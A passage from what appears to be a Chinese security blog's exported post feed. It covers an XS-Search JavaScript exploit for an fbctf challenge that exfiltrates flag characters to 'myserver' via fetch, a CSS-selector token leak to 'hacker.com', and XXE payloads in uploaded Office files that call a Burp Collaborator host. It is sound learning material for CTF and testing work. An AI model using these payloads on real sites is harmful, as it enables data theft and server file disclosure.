class="string">&quot;http://challenges.fbctf.com:8082/search?query=&quot;</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">search</span>(<span class="params">leak, charCounter</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> curChar = chars[charCounter];</span></span><br><span class="line"><span class="language-javascript">    x.<span class="title function_">setAttribute</span>(<span class="string">&quot;src&quot;</span>, <span class="string">&#x27;http://challenges.fbctf.com:8082/search?query=&#x27;</span> + leak + curChar);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(x);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;leak = &quot;</span> + leak + curChar);</span></span><br><span class="line"><span class="language-javascript">    x.<span class="property">onload</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (x.<span class="property">contentWindow</span>.<span class="property">frames</span>.<span class="property">length</span> != <span class="number">0</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">fetch</span>(<span class="string">&#x27;http://myserver/leak?&#x27;</span> + <span class="built_in">escape</span>(leak), &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">                <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span></span></span><br><span class="line"><span class="language-javascript">            &#125;);</span></span><br><span class="line"><span class="language-javascript">            leak += curChar</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">search</span>(leak, (charCounter + <span class="number">1</span>) % chars.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">exploit</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">search</span>(<span class="string">&quot;fb&#123;&quot;</span>, <span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">exploit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="基于-CSS-的跨站搜索攻击"><a href="#基于-CSS-的跨站搜索攻击" class="headerlink" title="基于 CSS 的跨站搜索攻击"></a>基于 CSS 的跨站搜索攻击</h2><p>获取标签属性值的可通过 CSS 选择器。</p>
<ul>
<li>dome.php<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$token1</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]); <span class="comment">#假如 $token1 值为：admin</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!doctype html&gt;&lt;meta charset=utf-<span class="number">8</span>&gt;</span><br><span class="line">&lt;input type=hidden value=<span class="meta">&lt;?=</span><span class="variable">$token1</span> <span class="meta">?&gt;</span>&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line"><span class="meta">&lt;?=</span><span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;#&lt;/style#i&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;css&#x27;</span>]) <span class="meta">?&gt;</span></span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure>
当可以注入 css 样式进行xss的时候，令 <code>$_GET[&#39;css&#39;]</code> &#x3D; <code>input[value^=&quot;a&quot;]&#123;background: url(http://hacker.com/)&#125;;</code>，将触发访问网站：<code>http://hacker.com/</code>。如此类推，即刻泄露全部 token 内容。</li>
</ul>
<p>CTF 示例：<a href="https://xz.aliyun.com/t/3075">SECCON 2018 - Web Ghostkingdom</a></p>
]]></content>
      <categories>
        <category>xs-search</category>
      </categories>
      <tags>
        <tag>xs-search</tag>
        <tag>跨站搜索攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>通过 Office Open XML 解析器进行XXE攻击</title>
    <url>/2022/03/18/%E9%80%9A%E8%BF%87-Office-Open-XML-%E8%A7%A3%E6%9E%90%E5%99%A8%E8%BF%9B%E8%A1%8CXXE%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><h3 id="XXE-via-Office-Open-XML-Parsers"><a href="#XXE-via-Office-Open-XML-Parsers" class="headerlink" title="XXE via Office Open XML Parsers"></a>XXE via Office Open XML Parsers</h3><p>（复制自 <a href="https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/"><strong>here</strong></a>）<br>许多 Web 应用程序允许您上传 Microsoft Office 文档，然后后端会从中解析数据。例如，您可能有一个 Web 应用程序，允许您通过上传 XLSX 格式的电子表格来导入数据。在某些时候，为了让解析器从电子表格中提取数据，解析器需要<strong>parse at least one XML file</strong>.</p>
<p>对此进行测试的唯一方法是生成一个包含 XXE 有效负载的 <strong>Microsoft Office 文件</strong>，所以让我们这样做。<br>首先，创建一个空目录来解压你的文档，然后解压！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">test$ ls</span><br><span class="line">test.docx</span><br><span class="line">test$ mkdir unzipped</span><br><span class="line">test$ unzip ./test.docx -d ./unzipped/</span><br><span class="line">Archive:  ./test.docx</span><br><span class="line">  inflating: ./unzipped/word/numbering.xml</span><br><span class="line">  inflating: ./unzipped/word/settings.xml</span><br><span class="line">  inflating: ./unzipped/word/fontTable.xml</span><br><span class="line">  inflating: ./unzipped/word/styles.xml</span><br><span class="line">  inflating: ./unzipped/word/document.xml</span><br><span class="line">  inflating: ./unzipped/word/_rels/document.xml.rels</span><br><span class="line">  inflating: ./unzipped/_rels/.rels</span><br><span class="line">  inflating: ./unzipped/word/theme/theme1.xml</span><br><span class="line">  inflating: ./unzipped/[Content_Types].xml</span><br></pre></td></tr></table></figure>

<p>在您喜欢的文本编辑器 (vim) 中打开 <code>./unzipped/word/document.xml</code> 并编辑 <strong>XML 以包含您喜欢的 XXE 有效负载</strong>。我尝试的第一件事往往是 HTTP 请求，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE x [ &lt;!ENTITY test SYSTEM &quot;http://[ID].burpcollaborator.net/&quot;&gt; ]&gt;</span><br><span class="line">&lt;x&gt;&amp;test;&lt;/x&gt;</span><br></pre></td></tr></table></figure>

<p>这些行应该像这样插入到两个根 XML 对象之间，当然您需要将 URL 替换为可以监视请求的 URL：</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-obscure.png" alt="Those lines should be inserted in between the two root XML objects, like thi"></p>
<p>剩下的就是<strong>压缩文件以创建恶意的 poc.docx 文件</strong>。从我们之前创建的“解压缩”目录中，运行以下命令：</p>
<p><img src="https://labs.detectify.com/wp-content/uploads/2021/09/xxe-unzipped.png" alt="From the &quot;unzipped&quot; directory that we created earlier, run the following:"></p>
<p>现在将文件上传到易受攻击的 Web 应用程序，并在 Burp Collaborator 日志监控是否收到请求。</p>
<h2 id="0x02-通过上传Excel对网站进行XXE攻击"><a href="#0x02-通过上传Excel对网站进行XXE攻击" class="headerlink" title="0x02-通过上传Excel对网站进行XXE攻击"></a>0x02-通过上传Excel对网站进行XXE攻击</h2><h3 id="0x02-1-确认XXE"><a href="#0x02-1-确认XXE" class="headerlink" title="0x02-1 确认XXE"></a>0x02-1 确认XXE</h3><p>某次对项目网站进行测试，发现应用系统中提供多个上传接口，允许用户上传 Excel 文件并在后端对 Excel 文件进行数据解析导入。<br>根据 <code>0x01-前言</code> 提及的方法，对 Excel 解压，修改文件XML内容。第一次修改的文件为 <code>[Content_Types].xml</code> ，修改后重压缩文件为 xsls 文件并上传，测试后现XXE攻击失败。<br>后续将 <code>xl/workbook.xml</code>、<code>xl/worksheets/sheet1.xml</code>、<code>xl/theme/theme1.xml</code>的内容均作修改，插入 XXE PayLoad。重新上传修改后的 xsls 文件，成功触发 XXE漏洞。</p>
<h3 id="0x02-2-读取文件"><a href="#0x02-2-读取文件" class="headerlink" title="0x02-2 读取文件"></a>0x02-2 读取文件</h3><p>还没来得及测试，对方已修复漏洞，bingo！！！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>WEB安全</tag>
        <tag>XXE</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
</search>
